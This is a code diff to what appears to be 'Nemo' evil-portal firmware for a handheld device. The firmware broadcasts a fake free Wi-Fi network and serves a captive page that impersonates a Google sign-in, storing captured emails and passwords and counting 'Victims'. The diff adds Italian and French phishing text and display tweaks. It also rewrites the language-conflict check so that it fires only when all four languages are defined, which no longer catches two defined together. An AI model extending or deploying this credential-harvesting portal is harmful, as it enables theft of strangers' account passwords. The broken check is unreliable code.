@@ -3,11 +3,12 @@
 // Retaining the Portuguese translations since this project has a large
 // fan base in Brazil. Shouts to CyberJulio as well.
 
-#define DEFAULT_AP_SSID_NAME "Nemo Free WiFi"
+#define DEFAULT_AP_SSID_NAME "NEMO Free WiFi"
 #define SD_CREDS_PATH "/nemo-portal-creds.txt"
 
-#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR)
-#error "Please define only one language: LANGUAGE_EN_US or LANGUAGE_PT_BR"
+
+#if defined(LANGUAGE_EN_US) && defined(LANGUAGE_PT_BR) && defined(LANGUAGE_IT_IT) && defined(LANGUAGE_FR_FR)
+#error "Please define only one language: LANGUAGE_EN_US, LANGUAGE_PT_BR, LANGUAGE_IT_IT or LANGUAGE_FR_FR"
 #endif
 
 #if defined(LANGUAGE_EN_US)
@@ -28,6 +29,24 @@
 #define LOGIN_BUTTON "Avançar"
 #define LOGIN_AFTER_MESSAGE "Fazendo login..."
 #define TYPE_SSID_TEXT "Tamanho entre 2 e 32\nInvalidos: ?,$,\",[,\\,],+\n\nDigite o SSID\nEnter para Confirmar\n\n"
+#elif defined(LANGUAGE_IT_IT)
+#define LOGIN_TITLE "Accedi"
+#define LOGIN_SUBTITLE "Utilizza il tuo Account Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Email"
+#define LOGIN_PASSWORD_PLACEHOLDER "Password"
+#define LOGIN_MESSAGE "Effettua il login per navigare in sicurezza."
+#define LOGIN_BUTTON "Avanti"
+#define LOGIN_AFTER_MESSAGE "Per favore attendi qualche minuto. Presto sarai in grado di accedere a Internet."
+#define TYPE_SSID_TEXT "SSID deve essere compresa tra 2 e 32\nInvalido: ?,$,\",[,\\,],+\n\nScrivi l'SSID\nPremi Invio per Confermare\n\n"
+#elif defined(LANGUAGE_FR_FR)
+#define LOGIN_TITLE "Connexion"
+#define LOGIN_SUBTITLE "Utiliser votre compte Google"
+#define LOGIN_EMAIL_PLACEHOLDER "Adresse e-mail"
+#define LOGIN_PASSWORD_PLACEHOLDER "Mot de passe"
+#define LOGIN_MESSAGE "Merci de vous connecter pour obtenir une navigation sécurisée."
+#define LOGIN_BUTTON "Suivant"
+#define LOGIN_AFTER_MESSAGE "Connexion en cours. Merci de patienter quelques instants."
+#define TYPE_SSID_TEXT "La longueur du SSID doit être entre 2 et 32\nInvalide: ?,$,\",[,\\,],+\n\nÉcrivez le SSID\nPressez Entrée pour Valider\n\n"
 #endif
 
 int totalCapturedCredentials = 0;
@@ -59,12 +78,12 @@ void setSSID(String ssid){
 
 #ifdef CARDPUTER
 void confirmOrTypeSSID(){
-  DISP.fillScreen(BLACK);
+  DISP.fillScreen(BGCOLOR);
   DISP.setSwapBytes(true);
   DISP.setTextSize(MEDIUM_TEXT);
-  DISP.setTextColor(TFT_RED, BGCOLOR);
+  DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.setCursor(0, 0);
-  DISP.println("WiFi SSID");
+  DISP.println("  WiFi SSID  ");
   DISP.setTextSize(TINY_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.println(TYPE_SSID_TEXT);
@@ -139,12 +158,12 @@ void getSSID(){
 }
 
 void printHomeToScreen() {
-  DISP.fillScreen(BLACK);
+  DISP.fillScreen(BGCOLOR);
   DISP.setSwapBytes(true);
   DISP.setTextSize(MEDIUM_TEXT);
-  DISP.setTextColor(TFT_RED, BGCOLOR);
+  DISP.setTextColor(BGCOLOR, FGCOLOR);
   DISP.setCursor(0, 0);
-  DISP.println("NEMO PORTAL");
+  DISP.println(" NEMO PORTAL ");
   DISP.setTextSize(SMALL_TEXT);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
   DISP.printf("%s\n\n",apSsidName.c_str());
@@ -152,8 +171,8 @@ void printHomeToScreen() {
   DISP.println(AP_GATEWAY);
   DISP.println("Paths: /creds /ssid");
   DISP.setTextSize(MEDIUM_TEXT);
-  DISP.setTextColor(TFT_RED, BGCOLOR);
-  DISP.printf("Victims: %d\n", totalCapturedCredentials);
+  DISP.setTextColor(BGCOLOR, FGCOLOR);
+  DISP.printf("Victims: %-4d\n", totalCapturedCredentials);
   DISP.setTextColor(FGCOLOR, BGCOLOR);
 }
 
